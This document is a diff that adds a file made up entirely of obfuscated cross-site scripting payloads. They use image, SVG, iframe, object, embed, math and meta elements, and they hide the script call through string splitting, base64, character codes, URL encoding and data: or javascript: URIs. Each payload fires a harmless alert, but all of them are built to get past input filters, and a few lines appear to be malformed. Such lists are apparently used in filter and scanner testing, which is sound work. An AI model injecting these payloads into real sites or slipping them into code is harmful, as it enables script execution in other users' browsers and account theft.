@@ -1,0 +1,32 @@
+```html
+<img src=x onerror=setTimeout('al'+'ert(1)',0)>
+<svg onload=window['al'+'ert']('XSS')>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>">
+<marquee onstart=window['al'+'ert'](1)></marquee>
+<object data=x type=image/png onerror=String.fromCharCode(97,108,101,114,116,40,49,41)>
+<details open ontoggle='window["al"+"ert"](1)'></details>
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<meta http-equiv="refresh" content="0;url=javascript:window['al'+'ert'](1)">
+<svg><desc><![CDATA[</desc><script>al\u0065rt(1)</script>]]></svg>
+<math href="javascript:al&#x65;rt(1)"></math>
+<img src=x onerror=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))>
+<svg><foreignObject><iframe srcdoc='<svg onload=eval("al"+"ert(1))>'></foreignObject></svg>
+<object data=x onerror=eval(atob('YWxlcnQoMSk='))>
+<iframe src="javascript:eval('al'+'ert(1)')">
+<embed src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='window["al"+"ert"](1)'></svg>">
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></svg>
+<object data="javascript:al%65%72%74(1)"></object>
+<iframe src="data:text/html,<script>al%65%72%74(1)</script>"></iframe>
+<svg onload=Function(atob("YWxlcnQoMSk="))()></svg>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<math xmlns="http://www.w3.org/1998/Math/MathML" href="javascript:al%65%72%74(1)"></math>
+<embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4=">
+<svg><style><![CDATA[x{}*{-o-link:'javascript:al\65rt(1)'}]]></style></svg>
+<iframe src="data:text/html,%3Cscript%3Eal%65rt(1)%3C/script%3E"></iframe>
+<svg><set attributeName="onload" to="javascript:al%65rt(1)"/></svg>
+<svg onload='(window["Function"](atob("YWxlcnQoMSk=")))()'></svg>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<object data="data:text/html,%3Cscript%3Eal%65rt(1)%3C/script%3E"></object>
+<iframe srcdoc="<script>setTimeout('al'+'ert(1)',0)</script>"></iframe>
+<svg><desc><![CDATA[</desc><script>setTimeout('al'+'ert(1)',0)</script>]]></svg>
+```
